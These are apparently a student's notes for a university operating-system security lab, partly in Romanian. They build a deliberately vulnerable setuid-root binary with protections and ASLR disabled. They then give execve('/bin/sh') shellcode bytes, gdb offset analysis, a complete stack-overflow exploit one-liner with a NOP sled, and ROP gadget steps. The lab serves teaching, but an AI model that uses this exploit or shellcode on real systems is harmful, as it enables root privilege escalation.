# Lab 7 Operating System Security

## Setup
```bash
sudo apt install libc6-dev-i386 gcc-multilib
gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack

sudo chown root:root vuln
sudo chmod 555 vuln
sudo chmod u+s vuln

$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Task 1
Disassemble using objdump in order to analyze the program.
```bash
objdump -d -M intel vuln
./vuln $(python3 -c 'print (116 * "A")')
```

## Task 2

Install nasm and compile shellcode using it:

```bash
sudo apt install nasm
nasm -f bin -o shellcode.o shellcode.S
```

Verify with objdump that we got the right payload.

```bash
objdump -b binary -m i386 -M intel -D shellcode.o
```

Extracting the bytes gives us the shellcode
``
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
``

## Task 3

```bash
gdb -q vuln
(gdb) b func
(gdb) run $(python3 -c 'print ("A"*116)')
(gdb) print $ebp
(gdb) print $ebp - 0x6c
```

## Task 4 & 5

Final payload structure:

``
[40 bytes of NOP - sled] [25 bytes of shellcode] [47 times ‘A’ will occupy 49 bytes] [4 bytes pointing in the middle of the NOP - sled: 0xffffce20]
``

## Task 6
adresa nu e aceeasi cu cea din gdb din cauza partii cu ENV + ARGS

merge daca adaug +80 (depinde la fiecare) la adresa din gdb sau daca printezi din vuln.c direct adresa lui `buf`
```bash
./vuln $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*40 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + b"A"*47 + b"\x2c\xcb\xff\xff")')
```

## Task 8
Se completeaza scriptul de python

## Task 9

```bash
 gcc rop.c -o vuln32 -fno-stack-protector -m32 -g -no-pie
 sudo -H python3 -m pip install ROPgadget
 ROPgadget --binary vuln32 | grep pop
```

In scriptul de python:
1. se ia adresa unui ROPgadget din outputul comenzii anterioare
2. se completeaza arg1 si arg2 din codul de c
3. se completeaza al doilea chain ca in lab
4. se ruleaza cu python
